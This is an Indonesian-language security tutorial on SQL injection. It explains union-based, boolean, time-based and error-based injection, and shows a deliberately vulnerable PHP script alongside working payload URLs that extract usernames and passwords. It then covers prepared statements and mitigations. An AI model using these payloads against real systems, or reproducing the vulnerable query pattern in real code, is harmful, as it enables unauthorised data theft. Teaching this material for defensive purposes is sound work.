# SQL Injection (SQLI)

## Definisi

SQL Injection merupakan serangan server side yang menggunakan database sebagai utilisasi dari serangannya. Serangan ini biasa terjadi karena kurang baiknya implementasi sanitasi user input. Penyerang menyisipkan bahasa SQL untuk melancarkan serangannya yang dapat berdampak pada: file inclusion, RCE, auth bypass, information disclosure, dan lain-lain.

![SQL](https://techterms.com/img/xl/sql_injection_1567.png)

## Tipe SQLI

1. `Union-based`: Penyerang menggunakan perintah `UNION` untuk menggabungkan hasil kueri yang sah dengan kueri berbahaya, lalu mendapatkan data dari tabel yang berbeda.
2. `Boolean-based Blind`: Penyerang mengajukan kueri yang menyebabkan respons aplikasi berubah berdasarkan kondisi benar atau salah.
3. `Time-based Blind`: Penyerang menggunakan fungsi yang menyebabkan penundaan waktu pada respons server (seperti `SLEEP()`), memungkinkan penyerang menyimpulkan hasil kueri SQL berdasarkan durasi respons, digunakan ketika aplikasi tidak menampilkan perbedaan output apa pun (fully blind).
4. `Error-based`:  Penyerang memanfaatkan pesan error yang ditampilkan oleh database untuk mengekstrak informasi, dengan menyisipkan kueri yang sengaja menyebabkan error dan menyertakan data yang ingin diambil ke dalam pesan error tersebut.

## Contoh Vulnerable Code

Sebagai studi kasus, digunakan fitur pencarian produk berdasarkan ID kategori yang mengambil input dari parameter GET tanpa sanitasi:
 
```php
<?php
$conn = mysqli_connect("localhost", "root", "", "testdb");
$id = $_GET['id'];
$sql = "SELECT name, price, description FROM products WHERE category_id = '$id'";
$result = mysqli_query($conn, $sql);
while ($row = mysqli_fetch_assoc($result)) {
    echo "<p>{$row['name']} - Rp{$row['price']}</p>";
}
mysqli_close($conn);
?>
```

1. `Union-based`

```
http://target.com/products.php?id=1' UNION SELECT username, password, NULL FROM users-- -
```
 
Query yang terbentuk pada server:
```sql
SELECT name, price, description FROM products WHERE category_id = '1' UNION SELECT username, password, NULL FROM users-- -'
```


2. `Boolean-based`

```
http://target.com/products.php?id=1' AND 1=1-- -
http://target.com/products.php?id=1' AND 1=2-- -
```
 
Query yang terbentuk:
```sql
SELECT name, price, description FROM products WHERE category_id = '1' AND 1=1-- -'
SELECT name, price, description FROM products WHERE category_id = '1' AND 1=2-- -'
```

3. `Time-based`

```
http://target.com/products.php?id=1' AND IF(1=1, SLEEP(5), 0)-- -
```
 
Query yang terbentuk:
```sql
SELECT name, price, description FROM products WHERE category_id = '1' AND IF(1=1, SLEEP(5), 0)-- -'
```

4. Error-based

```
http://target.com/products.php?id=1' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))-- -
```
 
Query yang terbentuk:
```sql
SELECT name, price, description FROM products WHERE category_id = '1' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))-- -'
```

## Secure Code

```php
<?php
$conn = mysqli_connect("localhost", "root", "", "testdb");
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = mysqli_prepare($conn, $sql);
mysqli_stmt_bind_param($stmt, "ss", $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
if (mysqli_num_rows($result) > 0) {
    echo "Login berhasil!";
} else {
    echo "Login gagal!";
}
mysqli_stmt_close($stmt);
mysqli_close($conn);
?>
```
 
Pada kode diatas menggunakan `prepare statement`, yang dimana input dari user akan divalidasi dan dicheck, sehingga saat penyerang menginputkan karakter SQL berbahaya akan dianggap sebagai data dan bukan bagian dari query perintah SQL

## Mitigasi

1. Menggunakan prepared statement atau parameterized query pada setiap transaksi/query dengan database
2. Menerapkan validasi input berbasis _whitelist_, misalnya memastikan salah satu parameter query harus bertipe data angka
3. Menggunakan prinsip _least-privilege_ pada akun yang dipakai dalam aplikasi untuk koneksi ke database
4. Menonaktifkan pesan error database yang mendetail pada environment production
5. Menggunakan WAF untuk mendeteksi dan blokir pola payload SQL yang umum digunakan untuk SQL Injection, namun juga harus melakukan perbaikan pada source code aplikasi itu sendiri

## Referensi

1. https://portswigger.net/web-security/sql-injection
2. https://owasp.org/www-community/attacks/SQL_Injection
